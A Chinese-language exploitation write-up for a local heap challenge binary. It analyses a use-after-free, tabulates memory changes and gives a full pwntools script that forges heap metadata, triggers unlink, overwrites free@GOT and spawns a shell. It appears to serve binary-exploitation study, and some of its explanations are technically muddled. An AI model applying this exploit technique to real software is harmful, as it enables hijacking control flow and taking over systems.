# 漏洞利用文档

## 执行环境

基于调试记录和程序分析，该二进制程序的运行环境如下：

- **文件类型**：64位ELF可执行文件，动态链接
- **安全特性**（通过checksec推断）：
  - **PIE**：禁用（基地址固定为0x400000）
  - **RELRO**：Partial RELRO（GOT表可写）
  - **NX**：启用（堆栈不可执行）
  - **Stack Canary**：启用栈保护
- **依赖库**：使用系统libc（通过ldd推断为标准glibc）
- **运行需求**：在Linux环境下运行，需要标准C库支持

## 漏洞成因

### 关键结构体分析
程序使用全局指针数组 `s`（位于地址 `0x6020D8`）管理堆内存：
- 数组包含10个字符指针（每个8字节）
- 用于存储通过选项1分配的堆内存地址
- 索引从0到9，对应不同的堆块

### 漏洞类型：Use-After-Free (UAF)

**漏洞位置**：
- `sub_400AB7` 函数（选项2 - 释放功能）
- `sub_400B2F` 函数（选项3 - 编辑功能）

**漏洞详细分析**：
1. **释放后未置空**：在 `sub_400AB7` 中，程序调用 `free((&s)[v1])` 释放指定索引的堆内存，但未将对应的全局指针置为NULL
2. **悬空指针使用**：在 `sub_400B2F` 中，程序直接使用已释放的指针：
   - `v2 = strlen((&s)[v1])` - 对已释放内存调用strlen
   - `sub_4008B6((&s)[v1], v2 + 1)` - 向已释放内存写入数据
3. **攻击面**：攻击者可以通过"分配→释放→编辑"的顺序，实现对已释放堆内存的读写操作

## 漏洞利用过程

### 内存变化总结表

| 步骤 | 操作 | 堆布局变化 | 全局指针数组 `s` 变化 | GOT表变化 | 关键状态 |
|------|------|-------------|----------------------|------------|----------|
| 1 | 程序初始化 | 堆未初始化 | 所有指针为NULL | free@GOT指向libc | 等待用户输入 |
| 2 | 分配5个0x100块 | 创建5个连续chunk | 索引0-4指向新分配堆块 | 无变化 | UAF条件准备 |
| 3 | 释放索引3,4 | 块3,4合并到top chunk | 索引3,4指针未置NULL（悬空） | 无变化 | UAF漏洞暴露 |
| 4 | 创建0x210 payload块 | 伪造unsorted bin chunk | 索引0指向伪造chunk数据区 | 无变化 | 任意地址写准备 |
| 5 | 释放索引4 | 触发堆管理器操作 | 索引0指向全局区域(0x6020c0) | 无变化 | 建立指针链 |
| 6 | 修改索引3 | 尝试覆盖GOT失败 | 索引9写入"1111" | free@GOT保持原值 | GOT覆盖失败 |
| 7 | 修改索引0 | 成功覆盖GOT | 形成三级指针链 | free@GOT → 0x4009c0 | 控制流劫持成功 |
| 8 | 释放索引2 | 触发free调用 | 无显著变化 | 无变化 | 执行目标函数 |
| 9 | 交互模式 | 进程替换为/bin/dash | 原程序内存不可访问 | 无意义 | 获取shell |

### 详细利用链分析

1. **初始状态设置**：程序启动，堆管理器初始化，全局指针数组全为NULL
2. **堆布局构建**：分配5个相同大小的堆块，创建连续的堆布局便于利用
3. **UAF条件创建**：释放中间两个块但不置空指针，制造悬空指针
4. **堆元数据伪造**：通过大块分配写入精心构造的payload，伪造unsorted bin chunk结构
5. **任意地址写建立**：利用堆管理器unlink操作修改全局指针，建立指向GOT的指针链
6. **控制流劫持**：通过UAF写操作覆盖free@GOT，将其指向目标函数地址(0x4009c0)
7. **触发执行**：调用free函数时实际执行目标函数，最终启动shell

## Exploit

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample9')
p = process('./data/sample9')
libc = elf.libc

# 关键地址定义
func_addr = 0x4009C0    # 目标函数地址，用于覆盖GOT
free_got_plt = 0x602018 # free函数的GOT表地址
p_addr = 0x6020D8       # 全局指针数组s的地址

def create(size, content):
    """分配指定大小的堆块并写入内容"""
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    """编辑指定索引的堆块内容（利用UAF漏洞）"""
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)

def delete(idx):
    """释放指定索引的堆块（制造UAF条件）"""
    p.sendline(b'2')
    p.sendline(str(idx).encode())

# 漏洞利用主流程
p.recvuntil('silent2')  # Step 1: 等待程序初始化完成

# Step 2: 构建初始堆布局 - 分配5个相同大小的块
create(0x100, b'AAAA')
create(0x100, b'BBBB') 
create(0x100, b'/bin/sh\x00')  # 准备shell字符串
create(0x100, b'DDDD')
create(0x100, b'EEEEE')

# Step 3: 制造UAF条件 - 释放中间两个块但不置空指针
delete(3)
delete(4)

# Step 4: 堆溢出攻击 - 构造伪造的unsorted bin chunk
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10)
payload += b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload)  # 分配大块触发堆布局重构

# Step 5: 触发unlink操作 - 修改全局指针指向GOT区域
delete(4)

# Step 6: 尝试GOT覆盖（第一次尝试可能失败）
modify(3, p64(free_got_plt)[0:4], b'1111')

# Step 7: 成功覆盖GOT表 - 将free函数指向目标地址
modify(0, p64(func_addr)[0:6], b'2222')

# Step 8: 触发漏洞利用 - 调用free实际执行目标函数
delete(2)

# Step 9: 获取shell控制权
p.interactive()
```

### 关键注释说明

1. **地址定义**：`func_addr` 是目标函数地址，用于覆盖GOT；`free_got_plt` 是free函数的GOT表项地址；`p_addr` 是全局指针数组地址
2. **堆布局构建**：分配5个相同大小的块创建连续的堆布局，便于后续的堆操作预测
3. **UAF制造**：释放但不置空指针，为后续的释放后使用创造条件
4. **Payload构造**：精心构造的堆元数据，包含伪造的fd/bk指针指向全局数组附近，为unlink攻击做准备
5. **GOT覆盖**：通过修改全局指针建立的指针链，实现对GOT表的任意写操作
6. **触发执行**：通过调用free函数触发控制流劫持，实际执行目标函数获取shell

该漏洞利用成功演示了如何通过UAF漏洞逐步升级为任意地址写，最终实现代码执行的控制流劫持攻击。
